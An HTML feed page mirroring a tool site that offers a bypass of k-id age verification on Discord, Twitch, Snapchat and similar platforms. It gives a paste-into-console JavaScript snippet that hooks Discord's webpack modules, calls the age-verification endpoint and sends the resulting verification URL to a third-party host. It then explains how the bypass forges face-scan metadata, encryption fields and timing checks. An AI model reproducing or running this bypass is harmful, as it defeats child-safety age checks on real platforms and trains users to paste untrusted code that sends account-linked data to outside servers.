<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://age-verifier.kibty.town/">Original</a>
    <h1>Discord/Twitch/Snapchat age verification bypass</h1>
    
    <div id="readability-page-1" class="page"><div><!--[--><!--[--><!----><!----><div> <p>age verifies your account automatically as an adult on any website using k-id</p> <p>made by <a href="https://kibty.town" target="_blank">xyzeva</a> and <a href="https://github.com/Dziurwa14" target="_blank">Dziurwa</a>, greetz to <a href="https://amplitudes.me/" target="_blank">amplitudes</a> (for previous work)</p> <h2>how to verify on discord</h2> <p>it <span>doesn&#39;t matter</span> if you are in the UK or similar region that
		currently has access to this, this will verify your account for the future global rollout in
		march aswell as current. to use, simply paste this script into your discord console by going to <a href="https://discord.com/app" target="_blank" rel="noreferer noopener">discord.com/app</a>, pressing <span>F12</span>, going to <span>Console</span> and copying and pasting and hitting enter on the following script and solving the captcha that pops
		up <span>(typing &#34;allow pasting&#34; before if necessary)</span>:</p> <pre>// add a chunk to extract webpack&#39;s moduleCache
let webpackRequire = webpackChunkdiscord_app.push([[Symbol()],{},(r) =&gt; r]);
// cleanup the chunk we added
webpackChunkdiscord_app.pop();

let modules = webpackRequire.m;
let cache = webpackRequire.c;

// https://github.com/moonlight-mod/moonlight/blob/main/packages/core-extensions/src/spacepack/webpackModules/spacepack.ts
// helper to find a webpack module via code snippet
function findByCode(src) {
  for (const [id, mod] of Object.entries(modules)) {
    if (mod.toString().includes(src)) {
      return cache[id].exports;
    }
  }
}

// helper to find an object by its key
function findObjectFromKey(exports, key) {
  if (!exports) return;
  for (const exportKey in exports) {
    const obj = exports[exportKey];
    if (obj &amp;&amp; obj[key]) return obj;
  }
}

// https://github.com/moonlight-mod/moonlight/blob/main/packages/mappings/src/mappings/discord/utils/HTTPUtils.ts
// find the discord api client
const api = findObjectFromKey(
  findByCode(&#39;.set(&#34;X-Audit-Log-Reason&#34;,&#39;),
  &#34;patch&#34;,
);

// send a api request to discord /age-verification/verify and then redirect the page to our website
const request = await api.post({
  url: &#34;/age-verification/verify&#34;,
  body: { method: 3 },
});
const verificationUrl = request.body.verification_webview_url;
window.location.href = `https://age-verifier.kibty.town/webview?url=${encodeURIComponent(verificationUrl)}`;</pre> <p>(feel free to read the code, we made it readable and we have nothing to hide)</p> <p>it should navigate to a link <span>(or give you a link to navigate to)</span>, from there, you can just wait until the page says success</p> <p>congrats! your discord account is now age verified.</p> <h2>how to verify on other platforms (twitch, kick, snapchat, ...others)</h2> <p>navigate to the age verification page and choose selfie, from there, get the url of the qr code
		and put it in this input box, and press verify</p>  <!--[!--><!--[!--><!--]--><!--]--> <h2>how does this work</h2> <p>k-id, the age verification provider discord uses doesn&#39;t store or send your face to the server.
		instead, it sends a bunch of metadata about your face and general process details. while this is
		good for your privacy <span>(well, considering some other providers send actual videos of your face to their servers)</span>, its also bad for them, because we can just send legitimate looking metadata to their servers
		and they have no way to tell its not legitimate. </p> <h3>step 1: encrypted_payload and auth_tag</h3> <p>the first thing we noticed that the old implementation doesn&#39;t send when comparing a legitimate
		request payload with a generated one, is its missing <code>encrypted_payload</code>, <code>auth_tag</code>, <code>timestamp</code> and <code>iv</code> in the body. </p> <h3>step 2: prediction data</h3> <p>heres where it kind of gets tricky, even after perfectly replicating the encryption, our
		verification attempt still doesn&#39;t succeed, so they must also be doing checks on the actual
		payload. </p> <ul><li><code>xScaledShiftAmt</code> and <code>yScaledShiftAmt</code> in predictions are not random but
			rather can be one of two values</li> <li>it is checked that the media name (camera) matches one of your media devices in the array of
			devices</li> <li>it is checked if the states completion times match the state timeline</li></ul> </div><!----><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
			
			
		</div></div>
  </body>
</html>
